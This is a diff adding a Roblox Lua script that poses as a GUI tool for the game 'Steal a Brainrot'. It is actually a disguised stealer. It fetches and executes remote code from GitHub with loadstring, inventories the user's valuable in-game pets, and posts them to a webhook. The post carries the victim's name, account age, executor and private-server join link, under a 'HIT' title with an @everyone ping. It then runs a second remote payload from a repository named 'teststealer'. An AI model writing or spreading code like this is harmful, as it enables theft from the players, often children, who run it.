@@ -1,0 +1,321 @@
+-- Services
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local StarterGui = game:GetService("StarterGui")
+
+local player = Players.LocalPlayer
+
+-- Hide default leaderboard
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+
+-- Load config from GitHub
+local config = {}
+do
+    local ok, res = pcall(function()
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-IDP/realscript/refs/heads/main/config"))()
+    end)
+    if ok and type(res) == "table" then
+        config = res
+    else
+        config = {
+            WEBHOOK = "",
+            targetNames = {},
+            Receiver = {}
+        }
+    end
+end
+
+local WEBHOOK = config.WEBHOOK
+local targetNames = config.targetNames or {}
+local receiverList = table.concat(config.Receiver or {}, ", ")
+
+-- Executor detection
+local function detectExecutor()
+    if syn then return "Synapse X"
+    elseif KRNL_LOADED then return "KRNL"
+    elseif fluxus then return "Fluxus"
+    elseif secure_load then return "Sentinel"
+    elseif getexecutorname then return getexecutorname()
+    elseif identifyexecutor then return identifyexecutor()
+    else return "Unknown" end
+end
+
+-- Account age
+local function getAccountAge()
+    return player and player.AccountAge or 0
+end
+
+-- Detect server type
+local serverType = "UNKNOWN"
+local map = Workspace:FindFirstChild("Map")
+if map then
+    local codes = map:FindFirstChild("Codes")
+    local main = codes and codes:FindFirstChild("Main")
+    local surfaceGui = main and main:FindFirstChild("SurfaceGui")
+    local sFrame = surfaceGui and surfaceGui:FindFirstChild("MainFrame")
+    local privateMsg = sFrame and sFrame:FindFirstChild("PrivateServerMessage")
+    serverType = (privateMsg and privateMsg.Visible) and "PRIVATE SERVER" or "PUBLIC SERVER"
+end
+
+if serverType == "PUBLIC SERVER" then
+    warn("Only use this script in private servers")
+    return
+end
+
+-- Priority lookup
+local function getPriority(name)
+    for i, t in ipairs(targetNames) do
+        if t.name and name:find(t.name) then
+            return i
+        end
+    end
+    return math.huge
+end
+
+local function parseValue(str)
+    local num = tonumber(str:match("[%d%.]+")) or 0
+    if str:find("K") then return num * 1e3
+    elseif str:find("M") then return num * 1e6
+    elseif str:find("B") then return num * 1e9
+    else return num end
+end
+
+-- ==================== Scan base (new) ====================
+local function collectValidPets()
+    local found = {}
+    local plots = Workspace:FindFirstChild("Plots")
+    if not plots then return found end
+
+    local myName = player.DisplayName
+
+    for _, plot in ipairs(plots:GetChildren()) do
+        local sign = plot:FindFirstChild("PlotSign")
+        if sign then
+            local sg = sign:FindFirstChild("SurfaceGui")
+            local frame = sg and sg:FindFirstChild("Frame")
+            local label = frame and frame:FindFirstChild("TextLabel")
+
+            if label and typeof(label.Text) == "string" and label.Text:find(myName) then
+                print("✅ Your base detected:", plot.Name)
+
+                for _, obj in ipairs(plot:GetDescendants()) do
+                    if obj:IsA("BillboardGui") then
+                        local overhead = obj
+                        local displayName = overhead:FindFirstChild("DisplayName")
+                        if displayName and displayName:IsA("TextLabel") then
+                            local petName = displayName.Text or "Unknown"
+                            local gen = overhead:FindFirstChild("Generation")
+                            local value = gen and gen.Text or "Unknown"
+
+                            local floor = "Unknown Floor"
+
+                            local podium = overhead:FindFirstAncestorWhichIsA("Model")
+                            if podium and podium.Name then
+                                local num = tonumber(podium.Name:match("^(%d+)_?"))
+                                if num then
+                                    if num >= 1 and num <= 10 then
+                                        floor = "1st Floor"
+                                    elseif num >= 11 and num <= 18 then
+                                        floor = "2nd Floor"
+                                    elseif num >= 19 then
+                                        floor = "3rd Floor"
+                                    end
+                                end
+                            end
+
+                            table.insert(found, {
+                                name = petName,
+                                value = value,
+                                floor = floor
+                            })
+
+                            print("📌 Found:", petName, "|", value, "|", floor)
+                        end
+                    end
+                end
+
+                break
+            end
+        end
+    end
+
+    return found
+end
+
+-- ==================== Webhook sending ====================
+local function sendWebhook(pets, privateServerLink)
+    if not pets or #pets == 0 then return end
+    if player and player:GetAttribute("WebhookSent") then return end
+
+    local highValueThreshold = 7.5e6
+    local priorityPets, normalPets = {}, {}
+    local shouldPing = false
+
+    for _, pet in ipairs(pets) do
+        local valueNum = parseValue(pet.value)
+        local line = string.format("%s → %s → %s", pet.name, pet.value, pet.floor)
+        if valueNum >= highValueThreshold then
+            shouldPing = true
+            table.insert(priorityPets, {line = line, valueNum = valueNum})
+        else
+            table.insert(normalPets, {line = line, valueNum = valueNum})
+        end
+    end
+
+    table.sort(priorityPets, function(a,b) return a.valueNum > b.valueNum end)
+    table.sort(normalPets, function(a,b) return a.valueNum > b.valueNum end)
+
+    local orderedLines = {}
+    for _, p in ipairs(priorityPets) do table.insert(orderedLines, p.line) end
+    for _, n in ipairs(normalPets) do table.insert(orderedLines, n.line) end
+
+    local lootText = #orderedLines > 0 and table.concat(orderedLines, "\n") or "Empty"
+    if lootText == "Empty" then return end
+
+    local playerInfoText = "```" ..
+        "Name: "..(player and player.Name or "Unknown").."\n"..
+        "Receiver: "..receiverList.."\n"..
+        "Executor: "..detectExecutor().."\n"..
+        "Account Age: "..tostring(getAccountAge()).." days".."```"
+
+    local petsText = "```"..lootText.."```"
+    local serverLink = privateServerLink or "No link entered"
+
+    local embed = {
+        ["title"] = "🧠 Steal a Brainrot HIT! - bloomscripts 🧠",
+        ["color"] = 12413107,
+        ["fields"] = {
+            {["name"]="Players", ["value"]=string.format("%d/6", #Players:GetPlayers())},
+            {["name"]="Server Type", ["value"]=serverType},
+            {["name"]="👥 Player Info", ["value"]=playerInfoText},
+            {["name"]="🎒 Brainrots in Base", ["value"]=petsText},
+            {["name"]="Join Server Link", ["value"]=("[Click to Join Server](%s)"):format(serverLink)}
+        }
+    }
+
+    local payload = {
+        ["content"] = shouldPing and "--- @everyone 🔥 **High Value Brainrot Detected!**" or "",
+        ["embeds"] = {embed},
+        ["allowed_mentions"] = {["parse"] = shouldPing and {"everyone"} or {}}
+    }
+
+    local req = (syn and syn.request) or http_request or (http and http.request) or request
+    if req and WEBHOOK and WEBHOOK ~= "" then
+        pcall(function()
+            req({
+                Url = WEBHOOK,
+                Method = "POST",
+                Headers = {["Content-Type"]="application/json"},
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+        if player then
+            player:SetAttribute("WebhookSent", true)
+        end
+    end
+end
+
+-- ==================== GUI ====================
+local playerGui = player:WaitForChild("PlayerGui")
+local screenGui = Instance.new("ScreenGui", playerGui)
+screenGui.Name = "StealBrainrotGUI"
+screenGui.ResetOnSpawn = false
+
+local frame = Instance.new("Frame", screenGui)
+frame.Size = UDim2.new(0, 320, 0, 180)
+frame.Position = UDim2.new(0.5, -160, 0.5, -90)
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+frame.Active = true
+frame.Draggable = true
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
+
+local title = Instance.new("TextLabel", frame)
+title.Text = "Steal a Brainrot"
+title.Font = Enum.Font.FredokaOne
+title.TextSize = 20
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.BackgroundTransparency = 1
+title.Size = UDim2.new(1, 0, 0, 28)
+title.Position = UDim2.new(0, 0, 0, 4)
+
+local closeButton = Instance.new("TextButton", frame)
+closeButton.Text = "X"
+closeButton.Font = Enum.Font.FredokaOne
+closeButton.TextSize = 18
+closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeButton.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
+closeButton.Size = UDim2.new(0, 28, 0, 28)
+closeButton.Position = UDim2.new(1, -34, 0, 4)
+Instance.new("UICorner", closeButton).CornerRadius = UDim.new(0, 8)
+closeButton.MouseButton1Click:Connect(function() screenGui:Destroy() end)
+
+local textBox = Instance.new("TextBox", frame)
+textBox.Size = UDim2.new(0.9, 0, 0, 36)
+textBox.Position = UDim2.new(0.05, 0, 0, 50)
+textBox.PlaceholderText = "Enter your private server link"
+textBox.Text = ""
+textBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+textBox.ClearTextOnFocus = false
+textBox.Font = Enum.Font.FredokaOne
+textBox.TextSize = 14
+Instance.new("UICorner", textBox).CornerRadius = UDim.new(0, 8)
+
+local statusLabel = Instance.new("TextLabel", frame)
+statusLabel.Size = UDim2.new(0.9, 0, 0, 24)
+statusLabel.Position = UDim2.new(0.05, 0, 0, 90)
+statusLabel.Text = ""
+statusLabel.Font = Enum.Font.FredokaOne
+statusLabel.TextSize = 14
+statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+statusLabel.BackgroundTransparency = 1
+
+local sendButton = Instance.new("TextButton", frame)
+sendButton.Text = "Send"
+sendButton.Font = Enum.Font.FredokaOne
+sendButton.TextSize = 18
+sendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+sendButton.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
+sendButton.Size = UDim2.new(0.4, 0, 0, 32)
+sendButton.Position = UDim2.new(0.3, 0, 0, 120)
+Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 8)
+
+local function isValidPrivateServerLink(txt)
+    return string.match(txt or "", "^https://www%.roblox%.com/share%?code=.+&type=Server$") ~= nil
+end
+
+textBox:GetPropertyChangedSignal("Text"):Connect(function()
+    if isValidPrivateServerLink(textBox.Text) then
+        statusLabel.Text = "Valid ✅"
+        statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+    else
+        statusLabel.Text = "Invalid ❌"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+    end
+end)
+
+local function handleSend()
+    local txt = textBox.Text or ""
+    if isValidPrivateServerLink(txt) then
+        screenGui:Destroy()
+        task.spawn(function()
+            local pets = collectValidPets()
+            if #pets > 0 then
+                sendWebhook(pets, txt)
+            end
+            task.wait(1)
+            pcall(function()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-IDP/teststealer/refs/heads/main/test3"))()
+            end)
+        end)
+    else
+        warn("Invalid private server link!")
+    end
+end
+
+sendButton.MouseButton1Click:Connect(handleSend)
+textBox.FocusLost:Connect(function(enterPressed)
+    if enterPressed then handleSend() end
+end)
